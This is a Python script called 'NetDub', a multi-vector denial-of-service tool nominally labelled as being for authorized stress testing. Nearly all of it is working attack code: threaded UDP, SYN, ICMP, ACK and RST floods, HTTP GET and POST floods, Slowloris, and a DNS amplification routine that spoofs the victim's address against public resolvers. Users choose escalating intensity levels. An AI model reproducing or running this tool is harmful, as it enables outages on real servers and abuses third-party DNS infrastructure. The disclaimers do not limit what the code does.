#!/usr/bin/env python3
"""
NetDub - Multi-Layer DDoS Testing Framework
Final Test Version - Root Privileges Required
For Server Stress Testing & Vulnerability Assessment Only
"""

import socket
import threading
import time
import random
import os
import sys
import struct
import select
from scapy.all import *
from multiprocessing import Process, cpu_count
from colorama import Fore, init
import ctypes
import signal

# Initialize colorama
init()

class NetDubFramework:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.attack_threads = []
        self.attack_processes = []
        self.running = False
        self.pps_counter = 0
        self.total_packets = 0
        
        # Check root privileges
        if os.geteuid() != 0:
            print(f"{Fore.RED}[!] Root privileges required for maximum performance{Fore.RESET}")
            sys.exit(1)
    
    def banner(self):
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.RED}║                      NetDub Framework                        ║{Fore.RESET}")
        print(f"{Fore.RED}║                    Final Test Version                        ║{Fore.RESET}")
        print(f"{Fore.RED}║              Multi-Layer DDoS Testing Suite                  ║{Fore.RESET}")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════╝{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️  ROOT PRIVILEGES DETECTED - MAXIMUM PERFORMANCE MODE{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY{Fore.RESET}")
        print()
    
    def setup_target(self):
        """Setup target configuration"""
        print(f"{Fore.CYAN}[*] Target Configuration{Fore.RESET}")
        self.target_host = input(f"{Fore.GREEN}🎯 Target Host/Domain: {Fore.RESET}").strip()
        self.target_port = int(input(f"{Fore.GREEN}🔌 Target Port: {Fore.RESET}").strip())
        
        # Resolve IP
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
            print(f"{Fore.GREEN}[✓] Target IP: {self.target_ip}{Fore.RESET}")
        except:
            print(f"{Fore.RED}[!] DNS Resolution failed{Fore.RESET}")
            sys.exit(1)
    
    def layer3_udp_flood(self):
        """Layer 3 - UDP Flood Attack"""
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            while self.running:
                try:
                    # Random payload
                    payload = os.urandom(random.randint(64, 1024))
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        # Launch multiple workers
        for _ in range(cpu_count() * 4):
            thread = threading.Thread(target=udp_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer3_tcp_syn_flood(self):
        """Layer 3 - TCP SYN Flood Attack"""
        def syn_worker():
            while self.running:
                try:
                    # Craft SYN packet
                    ip = IP(dst=self.target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535), 
                             dport=self.target_port, 
                             flags="S",
                             seq=random.randint(1000, 9000))
                    
                    send(ip/tcp, verbose=0)
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        # Launch SYN flood workers
        for _ in range(cpu_count() * 2):
            thread = threading.Thread(target=syn_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer3_icmp_flood(self):
        """Layer 3 - ICMP Flood Attack"""
        def icmp_worker():
            while self.running:
                try:
                    # Random ICMP packet
                    ip = IP(dst=self.target_ip)
                    icmp = ICMP(type=8, code=0)
                    payload = os.urandom(random.randint(56, 1500))
                    
                    send(ip/icmp/payload, verbose=0)
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        # Launch ICMP workers
        for _ in range(cpu_count()):
            thread = threading.Thread(target=icmp_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer4_tcp_ack_flood(self):
        """Layer 4 - TCP ACK Flood"""
        def ack_worker():
            while self.running:
                try:
                    ip = IP(dst=self.target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535),
                             dport=self.target_port,
                             flags="A",
                             seq=random.randint(1000, 9000),
                             ack=random.randint(1000, 9000))
                    
                    send(ip/tcp, verbose=0)
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        for _ in range(cpu_count() * 2):
            thread = threading.Thread(target=ack_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer4_tcp_rst_flood(self):
        """Layer 4 - TCP RST Flood"""
        def rst_worker():
            while self.running:
                try:
                    ip = IP(dst=self.target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535),
                             dport=self.target_port,
                             flags="R",
                             seq=random.randint(1000, 9000))
                    
                    send(ip/tcp, verbose=0)
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        for _ in range(cpu_count()):
            thread = threading.Thread(target=rst_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer7_http_flood(self):
        """Layer 7 - HTTP Flood Attack"""
        def http_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # HTTP GET request
                    request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += f"User-Agent: NetDub/{random.randint(1, 999)}\r\n"
                    request += "Connection: close\r\n\r\n"
                    
                    sock.send(request.encode())
                    sock.close()
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        for _ in range(cpu_count() * 8):
            thread = threading.Thread(target=http_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer7_slowloris(self):
        """Layer 7 - Slowloris Attack"""
        def slowloris_worker():
            sockets = []
            
            # Create initial connections
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.target_port))
                    
                    sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {self.target_host}\r\n".encode())
                    sock.send("User-Agent: NetDub-Slowloris\r\n".encode())
                    
                    sockets.append(sock)
                except:
                    pass
            
            # Keep connections alive
            while self.running:
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.pps_counter += 1
                    except:
                        sockets.remove(sock)
                
                time.sleep(10)
        
        for _ in range(cpu_count()):
            thread = threading.Thread(target=slowloris_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def layer7_post_flood(self):
        """Layer 7 - POST Flood Attack"""
        def post_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Large POST data
                    post_data = "data=" + "A" * random.randint(1000, 10000)
                    
                    request = f"POST /?{random.randint(1, 9999)} HTTP/1.1\r\n"
                    request += f"Host: {self.target_host}\r\n"
                    request += "User-Agent: NetDub-POST\r\n"
                    request += f"Content-Length: {len(post_data)}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                    request += post_data
                    
                    sock.send(request.encode())
                    sock.close()
                    self.pps_counter += 1
                    self.total_packets += 1
                except:
                    pass
        
        for _ in range(cpu_count() * 4):
            thread = threading.Thread(target=post_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def amplification_attack(self):
        """DNS/NTP Amplification Attack"""
        def amp_worker():
            while self.running:
                try:
                    # DNS amplification
                    dns_servers = ['8.8.8.8', '1.1.1.1', '208.67.222.222']
                    
                    for dns in dns_servers:
                        # Spoof source IP to target
                        ip = IP(src=self.target_ip, dst=dns)
                        udp = UDP(sport=random.randint(1024, 65535), dport=53)
                        
                        # DNS ANY query (amplification)
                        dns_query = DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
                        
                        send(ip/udp/dns_query, verbose=0)
                        self.pps_counter += 1
                        self.total_packets += 1
                except:
                    pass
        
        for _ in range(cpu_count()):
            thread = threading.Thread(target=amp_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def launch_attack(self, intensity):
        """Launch attack based on intensity level"""
        print(f"{Fore.RED}[*] Launching NetDub Attack - Intensity: {intensity}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_host} ({self.target_ip}:{self.target_port}){Fore.RESET}")
        print(f"{Fore.YELLOW}[*] CPU Cores: {cpu_count()}{Fore.RESET}")
        print()
        
        self.running = True
        
        if intensity >= 1:
            print(f"{Fore.CYAN}[*] Layer 3 - UDP Flood{Fore.RESET}")
            self.layer3_udp_flood()
        
        if intensity >= 2:
            print(f"{Fore.CYAN}[*] Layer 3 - TCP SYN Flood{Fore.RESET}")
            self.layer3_tcp_syn_flood()
        
        if intensity >= 3:
            print(f"{Fore.CYAN}[*] Layer 3 - ICMP Flood{Fore.RESET}")
            self.layer3_icmp_flood()
        
        if intensity >= 4:
            print(f"{Fore.CYAN}[*] Layer 4 - TCP ACK Flood{Fore.RESET}")
            self.layer4_tcp_ack_flood()
        
        if intensity >= 5:
            print(f"{Fore.CYAN}[*] Layer 4 - TCP RST Flood{Fore.RESET}")
            self.layer4_tcp_rst_flood()
        
        if intensity >= 6:
            print(f"{Fore.CYAN}[*] Layer 7 - HTTP Flood{Fore.RESET}")
            self.layer7_http_flood()
        
        if intensity >= 7:
            print(f"{Fore.CYAN}[*] Layer 7 - Slowloris{Fore.RESET}")
            self.layer7_slowloris()
        
        if intensity >= 8:
            print(f"{Fore.CYAN}[*] Layer 7 - POST Flood{Fore.RESET}")
            self.layer7_post_flood()
        
        if intensity >= 9:
            print(f"{Fore.CYAN}[*] Amplification Attack{Fore.RESET}")
            self.amplification_attack()
        
        print(f"{Fore.GREEN}[✓] All attack vectors launched{Fore.RESET}")
        print(f"{Fore.RED}[*] Press Ctrl+C to stop{Fore.RESET}")
        print()
    
    def monitor_stats(self):
        """Monitor attack statistics"""
        while self.running:
            try:
                time.sleep(1)
                current_pps = self.pps_counter
                self.pps_counter = 0
                
                print(f"{Fore.BLUE}[📊] PPS: {current_pps:,} | Total: {self.total_packets:,} | Threads: {len(self.attack_threads)}{Fore.RESET}")
                
                # Performance indicator
                if current_pps > 1000000:
                    print(f"{Fore.RED}[🔥] MAXIMUM PERFORMANCE - {current_pps:,} PPS{Fore.RESET}")
                elif current_pps > 100000:
                    print(f"{Fore.YELLOW}[⚡] HIGH PERFORMANCE - {current_pps:,} PPS{Fore.RESET}")
                
            except:
                break
    
    def stop_attack(self):
        """Stop all attack threads"""
        print(f"\n{Fore.RED}[*] Stopping NetDub Attack...{Fore.RESET}")
        self.running = False
        
        # Wait for threads to finish
        for thread in self.attack_threads:
            thread.join(timeout=2)
        
        print(f"{Fore.GREEN}[✓] Attack stopped{Fore.RESET}")
        print(f"{Fore.CYAN}[*] Total packets sent: {self.total_packets:,}{Fore.RESET}")
    
    def run(self):
        """Main execution"""
        self.banner()
        self.setup_target()
        
        print(f"{Fore.CYAN}[*] Attack Intensity Levels:{Fore.RESET}")
        print(f"  1. Light     - UDP Flood")
        print(f"  2. Medium    - + SYN Flood")
        print(f"  3. Heavy     - + ICMP Flood")
        print(f"  4. Extreme   - + ACK Flood")
        print(f"  5. Maximum   - + RST Flood")
        print(f"  6. Nuclear   - + HTTP Flood")
        print(f"  7. Insane    - + Slowloris")
        print(f"  8. Impossible - + POST Flood")
        print(f"  9. FINAL     - + Amplification")
        print()
        
        try:
            intensity = int(input(f"{Fore.GREEN}🔥 Select intensity (1-9): {Fore.RESET}"))
            
            if intensity < 1 or intensity > 9:
                print(f"{Fore.RED}[!] Invalid intensity level{Fore.RESET}")
                return
            
            # Launch attack
            self.launch_attack(intensity)
            
            # Start monitoring
            monitor_thread = threading.Thread(target=self.monitor_stats)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            # Wait for interruption
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Attack cancelled{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")

def main():
    """Main function"""
    try:
        netdub = NetDubFramework()
        netdub.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] NetDub terminated{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Fore.RESET}")

if __name__ == "__main__":
    main()
